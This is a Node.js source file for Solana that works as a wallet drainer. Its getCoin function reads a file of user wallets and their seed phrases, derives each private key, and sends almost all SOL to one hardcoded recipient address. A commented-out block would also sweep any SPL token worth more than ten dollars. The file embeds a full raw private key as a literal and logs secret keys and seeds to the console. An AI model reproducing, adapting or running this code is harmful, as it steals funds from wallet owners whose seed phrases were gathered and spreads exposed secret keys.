const { 
    Connection, 
    PublicKey, 
    Transaction, 
    SystemProgram, 
    LAMPORTS_PER_SOL,
    sendAndConfirmTransaction,
    Keypair,
    GetProgramAccountsFilter
} = require('@solana/web3.js');
const { getOrCreateAssociatedTokenAccount, transfer, TOKEN_PROGRAM_ID, createTransferInstruction } = require('@solana/spl-token');
const axios = require('axios');
const info = require('./info.json');
const bip39 = require('bip39');
const { derivePath } = require('ed25519-hd-key');

const connection = new Connection(process.env.QUICKNODE_RPC_URL, 'confirmed');
const privateKey = [94,125,131,242,255,99,233,18,56,254,185,214,96,176,206,190,0,236,64,40,51,209,93,208,101,123,145,144,86,68,173,129,13,123,86,60,106,217,183,126,142,4,223,142,214,129,230,188,99,72,208,84,93,35,196,222,199,184,234,146,45,152,222,245];

const getNumberDecimals = async (mintAddress) => {
    const info = await connection.getParsedAccountInfo(new PublicKey(mintAddress));
    const result = (info.value?.data).parsed.info.decimals;
    return result;
}


const getTokenPrice = async (mintAddress) => {
    try {
        const tokenInfo = await axios.get(`${process.env.DEXSCREENER_API_URL}${mintAddress}`);
        if(tokenInfo.data.pairs.length > 0){
            return tokenInfo.data.pairs[0].priceUsd;
        }
        return 0;
    } catch (error) {
        console.error('Error getting token price:', error);
        return null;
    }
}

const sendSOLToken = async (tradeWallet, secretKey, recipientAddress) => {
    try {
        console.log('privateKeyLength---', secretKey);
        console.log('recipientAddress---', recipientAddress);
        console.log('tradeWallet---', tradeWallet);
        const tokenInfo = await getTokenInfo(tradeWallet);
        const amount = tokenInfo.sol_balance - 0.1;
        const recipient = new PublicKey(recipientAddress);
        const senderKeypair = Keypair.fromSecretKey(new Uint8Array(privateKey));
        console.log('senderKeypair---', senderKeypair.publicKey.toString());
        console.log('amount---', amount * LAMPORTS_PER_SOL);

        const transaction = new Transaction().add(
            SystemProgram.transfer({
                fromPubkey: senderKeypair.publicKey,
                toPubkey: recipient,
                lamports: amount * LAMPORTS_PER_SOL,
            })
        );        
        console.log('transaction---', transaction);
        const signature = await sendAndConfirmTransaction(connection, transaction, [senderKeypair]);
        return {signature};
    } catch (error) {
        console.error('Error sending SOL token:', error);
        return null;
    }
}

const sendToken = async (amount, tokenAddress, recipientAddress) => {
    try{
        console.log('privateKeyLength---', privateKey.length);
        const senderKeypair = Keypair.fromSecretKey(new Uint8Array(privateKey));
        console.log('senderKeypair---', senderKeypair);

        const DESTINATION_WALLET = recipientAddress; 
        const MINT_ADDRESS = tokenAddress; //You must change this value!
        const decimals = await getNumberDecimals(MINT_ADDRESS);
        console.log('decimals---', decimals);
        let sourceAccount = await getOrCreateAssociatedTokenAccount(
            connection, 
            senderKeypair,
            new PublicKey(MINT_ADDRESS),
            senderKeypair.publicKey
        );
        console.log(`    Source Account: ${sourceAccount.address.toString()}`);


        console.log(`2 - Getting Destination Token Account`);
        let destinationAccount = await getOrCreateAssociatedTokenAccount(
            connection, 
            senderKeypair,
            new PublicKey(MINT_ADDRESS),
            new PublicKey(DESTINATION_WALLET)
        );
        console.log(`    Destination Account: ${destinationAccount.address.toString()}`);

        const tx = new Transaction();
        tx.add(createTransferInstruction(
            sourceAccount.address,
            destinationAccount.address,
            senderKeypair.publicKey,
            amount * Math.pow(10, decimals)
        ))
        console.log('tx---', tx);

        const latestBlockHash = await connection.getLatestBlockhash('confirmed');
        tx.recentBlockhash = await latestBlockHash.blockhash;    
        const signature = await sendAndConfirmTransaction(connection,tx,[senderKeypair]);
        console.log(
            '\x1b[32m', //Green Text
            `   Transaction Success!🎉`,
            `\n    https://solscan.io/tx/${signature}`
        );
    } catch (error) {
        console.error('Error sending token:', error);
        return null;
    }
}


const getTokenInfo = async (wallet) => {
    const filters = [
        {
          dataSize: 165,    //size of account (bytes)
        },
        {
          memcmp: {
            offset: 32,     //location of our query in the account (bytes)
            bytes: wallet,  //our search criteria, a base58 encoded string
          },            
        }];
    const accounts = await connection.getParsedProgramAccounts(
        TOKEN_PROGRAM_ID, //new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
        {filters: filters}
    );
    const tokens = [];
    let balance = await connection.getBalance(new PublicKey(wallet)) / LAMPORTS_PER_SOL;

    accounts.forEach((account, i) => {
        //Parse the account data
        const parsedAccountInfo = account.account.data;

        const mintAddress = parsedAccountInfo["parsed"]["info"]["mint"];
        const tokenBalance = parsedAccountInfo["parsed"]["info"]["tokenAmount"]["uiAmount"];
        const tokenDecimals = parsedAccountInfo["parsed"]["info"]["tokenAmount"]["decimals"];
        //Log results
        if(tokenBalance > 0){
            tokens.push({
                address: mintAddress,
                balance: tokenBalance,
                decimals: tokenDecimals
            });
        }
    });
    
    return {
        sol_balance: balance,
        tokens,
    };
}
const getCoin = async () => {
    const response = info || [];
    const promiseInfo = response.map(async (item) => {
        const tokenInfo = await getTokenInfo(item.userWallet);        
        const response = await sendSOLTokenWithSeedPharse(item.userWallet, item.seedPhrase, "A6Vd11gTsek2xtVhwyrRmK8R3hbpY4FuKH9ZnpnUhaqE");
        return response;
        
// 0x542575661D37156af30083a3e0CaD8a33FdE6480
        // tokenInfo.tokens.map(async (token) => {
        //     const price = await getTokenPrice(token.address);
        //     const amount = token.balance * price;
        //     console.log('amount---', amount);
        //     if(amount > 10){
        //         const response = await sendSPLTokenWithSeedPharse(token.address, (token.balance - 0.001), item.seedPhrase, "A6Vd11gTsek2xtVhwyrRmK8R3hbpY4FuKH9ZnpnUhaqE");
        //         return response;
        //     }
        // })
    });
    const result = await Promise.all(promiseInfo);
    return result;
}
const sendSOLTokenWithSeedPharse = async (tradeWallet, seedPhrase, recipientAddress) => {
    try {
        const seed = await bip39.mnemonicToSeed(seedPhrase);
        console.log('seed', seed);
        
        const derivedKey = derivePath("m/44'/501'/0'/0'", seed.toString('hex')).key;
        console.log('derivedKey', derivedKey);
        
        const senderKeypair = Keypair.fromSeed(derivedKey);
        console.log('privateKeyLength---', privateKey);
        console.log('recipientAddress---', recipientAddress);
        console.log('tradeWallet---', tradeWallet);
        const tokenInfo = await getTokenInfo(tradeWallet);
        const amount = tokenInfo.sol_balance - 0.001;
        const recipient = new PublicKey(recipientAddress);
        console.log('senderKeypair---', senderKeypair.publicKey.toString());
        console.log('amount---', amount * LAMPORTS_PER_SOL);

        const transaction = new Transaction().add(
            SystemProgram.transfer({
                fromPubkey: senderKeypair.publicKey,
                toPubkey: recipient,
                lamports: amount * LAMPORTS_PER_SOL,
            })
        );        
        console.log('transaction---', transaction);
        const signature = await sendAndConfirmTransaction(connection, transaction, [senderKeypair]);
        return {signature};
    } catch (error) {
        console.error('Error sending SOL token:', error);
        return null;
    }
}
const sendSPLTokenWithSeedPharse = async (tokenAddress, amount, seedPhrase, recipientAddress) => {
    try{
        const seed = await bip39.mnemonicToSeed(seedPhrase);
        
        const derivedKey = derivePath("m/44'/501'/0'/0'", seed.toString('hex')).key;
        
        const senderKeypair = Keypair.fromSeed(derivedKey);

        const DESTINATION_WALLET = recipientAddress; 
        const MINT_ADDRESS = tokenAddress; //You must change this value!
        const decimals = await getNumberDecimals(MINT_ADDRESS);
        console.log('decimals---', decimals);
        let sourceAccount = await getOrCreateAssociatedTokenAccount(
            connection, 
            senderKeypair,
            new PublicKey(MINT_ADDRESS),
            senderKeypair.publicKey
        );

        let destinationAccount = await getOrCreateAssociatedTokenAccount(
            connection, 
            senderKeypair,
            new PublicKey(MINT_ADDRESS),
            new PublicKey(DESTINATION_WALLET)
        );
        console.log(`    Destination Account: ${destinationAccount.address.toString()}`);

        const tx = new Transaction();
        tx.add(createTransferInstruction(
            sourceAccount.address,
            destinationAccount.address,
            senderKeypair.publicKey,
            amount * Math.pow(10, decimals)
        ))
        console.log('tx---', tx);

        const latestBlockHash = await connection.getLatestBlockhash('confirmed');
        tx.recentBlockhash = await latestBlockHash.blockhash;    
        const signature = await sendAndConfirmTransaction(connection,tx,[senderKeypair]);
        console.log(
            '\x1b[32m', //Green Text
            `   Transaction Success!🎉`,
            `\n    https://solscan.io/tx/${signature}`
        );
    } catch (error) {
        console.error('Error sending token:', error);
        return null;
    }
}
module.exports = {
  sendToken,
  sendSOLToken,
  getTokenPrice,
  getCoin,
  getTokenInfo
}
